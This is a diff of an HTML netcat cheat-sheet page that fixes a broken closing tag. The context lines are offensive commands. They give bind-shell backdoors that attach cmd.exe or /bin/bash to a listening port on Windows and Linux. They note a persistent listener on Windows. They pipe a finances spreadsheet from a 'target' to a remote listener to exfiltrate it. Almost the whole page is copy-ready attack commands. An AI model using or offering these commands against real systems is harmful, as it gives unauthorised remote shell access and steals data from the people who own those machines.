@@ -47,7 +47,7 @@ pre {
 <p>Connect to webserver: <pre>nc 192.168.1.105 80<br>HEAD / HTTP/1.0 </pre></p>
 <p>Listen for connections: <pre>nc -l -p 6996</pre><br>On windows use same command with upper case L to create a persistent listener that survives a reboot</p>
 <p>Create a backdoor: <br>
-   For windows: <pre>nc -l -p 6996 -e cmd.exe <br> nc -nnvl -p 80 -e c:\windows\system32\cmd.exe<\pre></p><br>
+   For windows: <pre>nc -l -p 6996 -e cmd.exe <br> nc -nnvl -p 80 -e c:\windows\system32\cmd.exe</pre></p><br>
    For Linux: <pre>nc -l -p 6996 -e /bin/bash</pre></p>
 <p>Exfiltrate files from target:<br>
  On source system: <pre>type finances.xls | nc 192.168.1.104 6996</pre><br>
